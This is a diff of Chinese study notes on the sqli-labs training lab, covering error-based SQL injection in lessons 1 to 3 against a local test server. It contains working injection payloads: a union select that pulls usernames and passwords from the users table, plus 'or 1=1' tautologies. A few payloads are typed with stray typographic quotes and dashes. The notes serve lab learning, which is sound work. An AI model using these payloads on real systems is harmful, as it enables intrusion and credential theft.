@@ -2,7 +2,7 @@
 sqli-labs 学习笔记
 
 ##
-lession-1
+lession-1  GET-Error based-single quotes String
 
 我们可以在http://127.0.0.1/sqllib/Less-5/?id=1后面直接添加一个 '
 我们可以看到提交到sql中的1'在经过sql语句构造后形成 '1'' LIMIT 0,1，多加了一个 ' 。这种方式就是从错误信息中得到我们所需要的信息，那我们接下来想如何将多余的 ' 去掉呢
@@ -37,6 +37,8 @@ http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,username,password%20f
 此时的sql语句为SELECT * FROM users WHERE id='-1'union select 1,username,password from users where id=2--+ LIMIT 0,1
 
 ##
+lession-2  GET-Error based-Intiger based
+
 我们又得到了一个Mysql返回的错误，提示我们语法错误。
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1′ at line 1
 现在执行的查询语句如下：
@@ -55,3 +57,21 @@ $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
 or 1=1
 or 1=1 --+
 其余的payload与less1中一直，只需要将less1中的 ' 去掉即可。
+
+##
+lession-3  GET-Error based-single quotes with twist
+
+我们使用?id='注入代码后，我们得到像这样的一个错误：
+MySQL server version for the right syntax to use near "") LIMIT 0,1′ at line 1
+
+这里它意味着，开发者使用的查询是：
+Select login_name, select password from table where id= ('our input here')
+所以我们再用这样的代码来进行注入：
+?id=1′) –-+
+
+可以成功注入的有：
+') or '1'=('1'
+) or 1=1 --+
+其余的payload与less1中一直，只需要将less1中的 ' 添加） 即')
+
+
